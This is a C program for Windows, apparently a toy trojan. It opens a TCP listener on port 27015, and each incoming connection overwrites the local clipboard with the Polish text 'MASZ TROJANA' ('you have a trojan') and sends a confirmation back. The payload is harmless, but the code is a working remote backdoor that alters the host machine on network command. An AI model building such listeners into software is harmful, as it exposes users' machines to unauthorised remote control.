#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"

DWORD WINAPI ClientHandler(LPVOID lpParameter);

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for the server to listen for client connections.
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    printf("Waiting for incoming connections...\n");

    // Accept a client socket
    while (1) {
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        // Create a new thread for the accepted client and continue listening for new connections
        DWORD dwThreadId;
        HANDLE hThread = CreateThread(NULL, 0, ClientHandler, (LPVOID)ClientSocket, 0, &dwThreadId);
        if (hThread == NULL) {
            printf("CreateThread failed with error: %d\n", GetLastError());
            closesocket(ClientSocket);
            continue;
        }
        CloseHandle(hThread);
    }
}

DWORD WINAPI ClientHandler(LPVOID lpParameter) {
    SOCKET ClientSocket = (SOCKET)lpParameter;
    int iResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;

    do {
        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            printf("Bytes received: %d\n", iResult);
            printf("Message: ", iResult);
            for (int i = 0; i < iResult; i++) printf("%c", recvbuf[i]);
            printf("\n");

            // Open the clipboard and empty its contents
            if (OpenClipboard(NULL)) {
                EmptyClipboard();

                // Allocate global memory for the new clipboard data
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, iResult + 1);
                if (hMem != NULL) {
                    // Lock the memory and copy the data into it
                    LPSTR lpMem = (LPSTR)GlobalLock(hMem);
                    if (lpMem != NULL) {
                        const char* sendbuf = "MASZ TROJANA";
                        memcpy(lpMem, sendbuf, 12);
                        lpMem[12] = '\0';
                        GlobalUnlock(hMem);

                        // Set the clipboard data
                        SetClipboardData(CF_TEXT, hMem);
                    }
                }

                CloseClipboard();
            }

            // Send an acknowledgment message back to the client
            char ackbuf[] = "Clipboard content has been modified.";
            iResult = send(ClientSocket, ackbuf, sizeof(ackbuf), 0);
            if (iResult == SOCKET_ERROR) {
                printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(ClientSocket);
                return 1;
            }
            printf("Bytes sent: %d\n", iResult);
        }
        else if (iResult == 0)
            printf("Connection closing...\n");
        else {
            printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            return 1;
        }
    } while (iResult > 0);

    closesocket(ClientSocket);
    return 0;
}